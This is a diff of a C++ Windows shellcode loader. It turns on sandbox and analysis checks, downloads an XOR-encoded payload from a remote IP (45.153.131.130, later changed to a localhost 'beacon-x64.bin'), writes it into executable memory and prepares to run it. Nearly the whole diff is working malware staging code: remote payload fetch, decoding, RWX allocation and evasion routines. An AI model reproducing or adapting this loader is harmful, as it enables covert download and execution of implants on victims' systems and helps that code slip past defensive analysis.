@@ -198,33 +198,32 @@ bool whereisWIFI()
 
 int main() {
 
-    //whoisyourdad();
+    whoisyourdad();
     tbCheck();
-    /*if (regCheck()) {
+    if (regCheck()) {
         printf("Hello,world!");
         return 0;
-    }*/
+    }
     HINTERNET inet = InternetOpenA("Python api test", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (inet == NULL) {
         cout << "Error opening internet connection: " << GetLastError() << endl;
         return 1;
     }
-    HINTERNET url = InternetOpenUrlA(inet, "http://45.153.131.130:30080/favicon.lco", NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    /*HINTERNET url = InternetOpenUrlA(inet, "http://45.153.131.130:40080/favicon.lco", NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 0);*/
-    /*if (url == NULL) {
+    HINTERNET url = InternetOpenUrlA(inet, "http://localhost/beacon-x64.bin", NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (url == NULL) {
         cout << "Error opening URL: " << GetLastError() << endl;
         InternetCloseHandle(inet);
         return 1;
-    }*/
+    }
 
     DWORD size = 295940;
 
-    /* if (!InternetQueryDataAvailable(url, &size, 0, 0)) {
+    if (!InternetQueryDataAvailable(url, &size, 0, 0)) {
          cout << "Error getting shellcode size: " << GetLastError() << endl;
          InternetCloseHandle(url);
          InternetCloseHandle(inet);
          return 1;
-     }*/
+     }
 
      // Allocate memory and read the shellcode into it
     LPVOID testcodes = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -255,10 +254,10 @@ int main() {
     InternetCloseHandle(url);
     InternetCloseHandle(inet);
     
-    /*for (DWORD i = 0; i < size; i++) {
+    for (DWORD i = 0; i < size; i++) {
         *((LPBYTE)testcodes + i) = *((LPBYTE)testcodes + i) ^ 88;
-    }*/
-    //whereisWIFI();
+    }
+    whereisWIFI();
     //((void(*)())testcodes)();
     PVOID lpContext;
     BOOL  bStatus;
